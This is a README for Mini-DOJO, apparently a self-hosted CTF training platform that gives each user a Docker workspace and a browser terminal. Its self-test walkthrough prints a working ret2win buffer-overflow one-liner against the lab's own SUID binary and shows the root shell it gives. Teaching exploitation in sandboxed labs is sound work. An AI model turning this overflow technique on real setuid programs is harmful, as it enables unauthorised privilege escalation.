# 🥋 Mini-DOJO: A CTF Workspace Platform

Mini-DOJO is a lightweight, self-hosted Capture The Flag (CTF) platform designed for learning and practice. It provides users with isolated Docker-based workspaces for each challenge, complete with a browser-based terminal, allowing them to solve challenges in a secure and sandboxed environment.

This MVP (Minimum Viable Product) includes a fully functional `ret2win` binary exploitation challenge to demonstrate the core features of the platform.

![Mini-Dojo Screenshot](https://i.imgur.com/your-screenshot-url.png) <!-- Placeholder: Replace with an actual screenshot if desired -->

## ✨ Features

- **User Authentication**: Secure user registration, login, and session management.
- **Challenge Listings**: A central page to view available challenges and your solve status.
- **Isolated Workspaces**: One-click start/stop for per-user, per-challenge Docker containers.
- **Browser-Based Terminal**: Each workspace includes a `ttyd` terminal accessible directly in the browser, simulating a Linux shell.
- **SUID Exploitation**: The first challenge (`dojo1-ret2win`) demonstrates a classic SUID binary exploit.
- **Flag Submission**: A simple system to submit flags and track progress.
- **Automated Cleanup**: A background service automatically stops and removes old containers to conserve resources.
- **Resource Limits**: Workspaces are resource-constrained (CPU, memory, PIDs) for stability.

## 🛠️ Tech Stack

| Component               | Technology                                      |
| ----------------------- | ----------------------------------------------- |
| **Web Backend**         | FastAPI (Python)                                |
| **Database**            | PostgreSQL                                      |
| **ORM**                 | SQLAlchemy                                      |
| **Web UI**              | Jinja2 Server-Side Templates                    |
| **Containerization**    | Docker & Docker Compose                         |
| **Container API**       | Docker Engine API via Python SDK                |
| **Workspace Terminal**  | `ttyd`                                          |
| **Cleanup Service**     | Python script                                   |

## 🚀 Getting Started

Follow these steps to get the Mini-DOJO platform running on your local machine. This guide assumes you have `Docker` and `docker-compose` installed.

### 1. Build the Challenge Image

First, you need to build the Docker image for the `ret2win` challenge. This image contains the vulnerable binary and the `ttyd` terminal environment.

```bash
# Navigate to the challenge directory
cd mini-dojo/challenges/dojo1-ret2win/

# Build the image
docker build -t mini-dojo/dojo1-ret2win:latest .

# Return to the root directory
cd ../../
```

### 2. Run with Docker Compose

Once the challenge image is built, you can start all the services (web app, database, cleanup job) with a single command from the repository root.

```bash
# From the mini-dojo/ directory
docker compose up --build
```

This command will:
- Build the `web` and `cleanup` service images.
- Start the PostgreSQL database.
- Start the FastAPI web server on `http://127.0.0.1:8080`.
- Start the cleanup service.
- Create a persistent Docker volume for the database.

### 3. Open Your Browser

Navigate to the web UI in your browser:

**[http://127.0.0.1:8080](http://127.0.0.1:8080)**

### 4. Register and Login

- Click **Register** to create a new user account.
- After registering, you will be automatically logged in and redirected to the challenges page.

### 5. Start Your Workspace

- On the challenges page, click **View Challenge** for "Dojo 1: ret2win".
- Click the **Start Workspace** button. This will launch a dedicated Docker container for you.
- Once the workspace is running, a **Terminal URL** will appear (e.g., `http://127.0.0.1:30000`).

### 6. Solve the Challenge & Submit the Flag

- Click the terminal URL to open the browser-based shell.
- Follow the instructions in `/challenge/README.md` to exploit the binary.
- Once you have a root shell, get the flag:
  ```sh
  # cat /flag
  ```
- Copy the flag and paste it into the **Submit Flag** form on the challenge page.
- If correct, the challenge will be marked as solved!

## ✅ Self-Test Walkthrough

Here is a quick self-test to ensure everything is working correctly.

1.  **Start Workspace**: Click "Start Workspace" on the `dojo1-ret2win` challenge page.
2.  **Open Terminal**: Click the generated workspace URL.
3.  **Confirm User**: In the new terminal, run `id`. You should see you are logged in as `hacker`:
    ```sh
    $ id
    uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
    ```
4.  **Confirm Flag Permissions**: Try to read the flag as the `hacker` user. Access should be denied:
    ```sh
    $ cat /flag
    cat: /flag: Permission denied
    ```
5.  **Run Exploit**: Run the challenge binary to see the address of the `win()` function. Then, use a simple Python one-liner to craft and pipe your exploit. (Replace `0x4011e6` with the address you see).
    ```sh
    $ /challenge/challenge
    Welcome to Dojo 1: ret2win!
    ...
    win() function is located at: 0x4011e6

    Enter your input: 
    $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + (0x4011e6).to_bytes(8, "little"))' | /challenge/challenge
    ```
6.  **Become Root & Get Flag**: The exploit will give you a root shell. Now you can read the flag:
    ```sh
    # id
    uid=0(root) gid=0(root) groups=0(root),1000(hacker)
    # cat /flag
    flag{dojo1-ret2win:1:a1b2c3d4e5f6a7b8}
    ```
7.  **Submit Flag**: Copy the flag and submit it on the web page to see the "Solved ✅" confirmation.

## ⚠️ Troubleshooting

### Windows SSH Host Key Warning

When running Docker on Windows (especially with WSL2), you might see a warning in the `docker compose` logs related to SSH host keys. This is a known behavior and can typically be ignored for this project, as we are not using SSH to connect to containers.

The web application communicates with the Docker daemon via the mounted Docker socket (`/var/run/docker.sock`), not SSH.

### "No free ports available"

If you see this error, it means all ports in the configured range (`30000-31000` by default) are in use by active workspaces. You can either stop some workspaces or increase the `PORT_RANGE_END` environment variable in `docker-compose.yml`.

---

*This project was created by Manus AI.*
